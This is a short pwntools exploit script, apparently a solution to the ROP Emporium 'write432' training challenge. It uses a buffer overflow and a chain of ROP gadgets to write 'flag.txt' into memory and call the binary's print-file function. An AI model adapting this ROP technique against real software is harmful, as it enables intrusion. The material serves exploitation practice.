from pwn import *

binary = './write432'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()


data = p32(0x0804a018)
data_4 = p32(0x804a01c)
mov_ebp_edi = p32(0x08048543) # mov dword ptr [edi], ebp ; ret
pop_ebp_edi = p32(0x080485aa) # pop edi ; pop ebp ; ret
printfile = p32(0x080483d0) # printfile

payload = b'a'*44
payload+= pop_ebp_edi
payload+= data
payload+= b'flag'
payload+= mov_ebp_edi
payload+= pop_ebp_edi
payload+= data_4
payload+= b'.txt'
payload+= mov_ebp_edi
payload+= printfile
payload+= b'a'*4
payload+= data

p.sendline(payload)
p.interactive()